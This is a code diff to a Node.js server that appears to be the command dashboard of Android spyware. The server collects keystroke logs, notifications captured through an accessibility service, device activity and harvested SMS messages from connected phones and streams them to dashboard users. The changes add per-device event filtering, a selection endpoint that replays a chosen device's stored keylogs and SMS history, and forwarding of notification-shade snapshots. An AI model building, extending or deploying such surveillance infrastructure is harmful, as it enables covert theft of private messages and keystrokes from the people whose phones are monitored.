@@ -32,7 +32,10 @@ mongoose.set('bufferTimeoutMS', 5000);
 
 const { verifyJwt } = require('./jwtSecret');
 const { formatDateTime } = require('./utils/dateTime');
-const { formatSseDataEvent, dashboardClientMayReceive } = require('./utils/sseProtocol');
+const {
+    formatSseDataEvent,
+    dashboardClientMayReceiveEvent,
+} = require('./utils/sseProtocol');
 
 // ============================================
 // RUNTIME LOG CAPTURE
@@ -1226,7 +1229,18 @@ function tcpSend(conn, event, data) {
 /** Push a server-sent event to one specific SSE (Dashboard) client */
 function sseSend(clientId, event, data) {
     const client = sseClients.get(clientId);
-    if (client && !client.res.writableEnded && !client.res.destroyed) {
+    const deviceId = data?.deviceId;
+    const accessId = String(
+        data?.accessId
+        || (deviceId && inMemoryDevices.get(String(deviceId))?.accessId)
+        || (client?.selectedDeviceId === deviceId ? client.selectedDeviceAccessId : '')
+        || ''
+    ).trim();
+    const deviceScoped = !!deviceId || !!data?.accessId;
+    if (client
+        && dashboardClientMayReceiveEvent(client, accessId, deviceScoped, event, deviceId)
+        && !client.res.writableEnded
+        && !client.res.destroyed) {
         try {
             client.res.write(formatSseDataEvent(event, data));
             if (typeof client.res.flush === 'function') client.res.flush();
@@ -1244,7 +1258,7 @@ function broadcastDash(event, data) {
     // stream:frame payloads) for every connected dashboard tab.
     const payload = formatSseDataEvent(event, data);
     for (const [id, client] of sseClients) {
-        if (!dashboardClientMayReceive(client, accessId, deviceScoped)) continue;
+        if (!dashboardClientMayReceiveEvent(client, accessId, deviceScoped, event, deviceId)) continue;
         if (client.res.writableEnded || client.res.destroyed) continue;
         try {
             client.res.write(payload);
@@ -1266,7 +1280,7 @@ function broadcastLatestDash(event, data) {
     const payload = formatSseDataEvent(event, data);
 
     for (const [id, client] of sseClients) {
-        if (!dashboardClientMayReceive(client, accessId, deviceScoped) || client.res.writableEnded || client.res.destroyed) continue;
+        if (!dashboardClientMayReceiveEvent(client, accessId, deviceScoped, event, deviceId) || client.res.writableEnded || client.res.destroyed) continue;
         let state = realtimeSseState.get(id);
         if (!state) {
             state = { sending: false, latestPayload: null };
@@ -1724,6 +1738,27 @@ async function processMessage(clientId, clientType, event, data) {
             // Persist to Redis (non-blocking)
             R.pushNotification(deviceId, entry).catch(() => {});
             broadcastDash('notification:push', entry);
+        }
+        return;
+    }
+
+    // Accessibility-service snapshot sent when the notification shade opens.
+    // Forward it through the existing history contract instead of treating it
+    // as an unknown protocol event.
+    if (event === 'notification:panel_snapshot') {
+        const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now();
+        const deviceId = conn?.deviceId || data?.deviceId;
+        const notifications = Array.isArray(data?.notifications)
+            ? data.notifications.slice(0, 200)
+            : [];
+        if (deviceId && notifications.length) {
+            broadcastDash('notification:history', {
+                deviceId,
+                entries: notifications,
+                source: 'panel_snapshot',
+                timestamp: data.timestamp || Date.now(),
+            });
         }
         return;
     }
@@ -2299,7 +2334,15 @@ app.get('/api/events', async (req, res) => {
     res.setHeader('X-Accel-Buffering', 'no');  // disable nginx buffering
     res.flushHeaders();
 
-    sseClients.set(clientId, { res, token, role, accessId, userId });
+    sseClients.set(clientId, {
+        res,
+        token,
+        role,
+        accessId,
+        userId,
+        selectedDeviceId: null,
+        selectedDeviceAccessId: '',
+    });
     log('SSE', `Dashboard connected ${clientId} (${role}${accessId ? ' / ' + accessId : ''})`);
 
     const accessFilter = role === 'user' ? accessId : null;
@@ -2360,29 +2403,54 @@ app.get('/api/events', async (req, res) => {
     if (res.writableEnded || res.destroyed) return;
     sseSend(clientId, 'device:list', list);
 
-    // Replay buffered data from Redis for all known devices so the dashboard
-    // sees everything that happened while it was disconnected / the user was away.
-    try {
-        const deviceIds = list.map(d => d.deviceId).filter(Boolean);
-        for (const did of deviceIds) {
-            const [keylogs, notifications, activity, smsHuntMessages] = await Promise.all([
-                R.getKeylogs(did),
-                R.getNotifications(did),
-                R.getActivity(did),
-                SmsHuntMessage.find({ deviceId: did }).sort({ receivedAt: -1 }).limit(500).lean().catch(() => []),
-            ]);
-            if (keylogs.length)        sseSend(clientId, 'keylog:history',       { deviceId: did, entries: keylogs });
-            if (notifications.length)  sseSend(clientId, 'notification:history', { deviceId: did, entries: notifications });
-            if (activity.length)       sseSend(clientId, 'activity:history',     { deviceId: did, entries: activity });
-            if (smsHuntMessages.length) sseSend(clientId, 'sms_hunt:history', { deviceId: did, messages: smsHuntMessages });
-        }
-    } catch (e) { log('SSE', `History replay error: ${e.message}`, 'warn'); }
-
 });
 
 // ── Dashboard ping — measure server RTT over HTTP/TCP ────────────────────────
 app.post('/api/dashboard/ping', (req, res) => {
     res.json({ sentAt: req.body?.sentAt ?? null, serverAt: Date.now() });
+});
+
+async function sendDashboardDeviceHistory(clientId, deviceId) {
+    const [keylogs, notifications, activity, smsHuntMessages] = await Promise.all([
+        R.getKeylogs(deviceId),
+        R.getNotifications(deviceId),
+        R.getActivity(deviceId),
+        SmsHuntMessage.find({ deviceId }).sort({ receivedAt: -1 }).limit(500).lean().catch(() => []),
+    ]);
+    const client = sseClients.get(clientId);
+    if (!client || client.selectedDeviceId !== deviceId) return;
+    if (keylogs.length) sseSend(clientId, 'keylog:history', { deviceId, entries: keylogs });
+    if (notifications.length) sseSend(clientId, 'notification:history', { deviceId, entries: notifications });
+    if (activity.length) sseSend(clientId, 'activity:history', { deviceId, entries: activity });
+    if (smsHuntMessages.length) sseSend(clientId, 'sms_hunt:history', { deviceId, messages: smsHuntMessages });
+}
+
+app.post('/api/dashboard/selection', requireUserOrAdmin, async (req, res) => {
+    const sseClientId = String(req.body?.sseClientId || '');
+    const deviceId = req.body?.deviceId ? String(req.body.deviceId) : null;
+    const client = sseClients.get(sseClientId);
+    if (!client || client.role !== req.authRole) {
+        return res.status(404).json({ success: false, error: 'Dashboard session not found' });
+    }
+    const requestToken = (req.headers['authorization'] || '').replace('Bearer ', '') || req.query.token;
+    if (client.token !== requestToken
+        || (req.authRole === 'user' && req.authAccessId
+            && String(client.accessId || '') !== String(req.authAccessId))) {
+        return res.status(403).json({ success: false, error: 'Dashboard session does not belong to this user' });
+    }
+    let selectedDeviceAccessId = '';
+    if (deviceId) {
+        const authorized = await authorizeSmsHuntDevice(req, deviceId);
+        if (!authorized) return res.status(404).json({ success: false, error: 'Device not found' });
+        selectedDeviceAccessId = authorized.accessId || '';
+    }
+    client.selectedDeviceId = deviceId;
+    client.selectedDeviceAccessId = selectedDeviceAccessId;
+    if (deviceId) {
+        sendDashboardDeviceHistory(sseClientId, deviceId)
+            .catch(error => log('SSE', `Selected-device history replay failed: ${error.message}`, 'warn'));
+    }
+    res.json({ success: true, deviceId });
 });
 
 // ============================================
@@ -5459,7 +5527,9 @@ function broadcastDashScoped(event, data, accessId) {
     // listens through EventSource.onmessage, which ignores named SSE events.
     const payload = formatSseDataEvent(event, data);
     for (const [, client] of sseClients) {
-        if (!dashboardClientMayReceive(client, accessId, true) || client.res.writableEnded || client.res.destroyed) continue;
+        if (!dashboardClientMayReceiveEvent(client, accessId, true, event, data?.deviceId)
+            || client.res.writableEnded
+            || client.res.destroyed) continue;
         try {
             client.res.write(payload);
             if (typeof client.res.flush === 'function') client.res.flush();
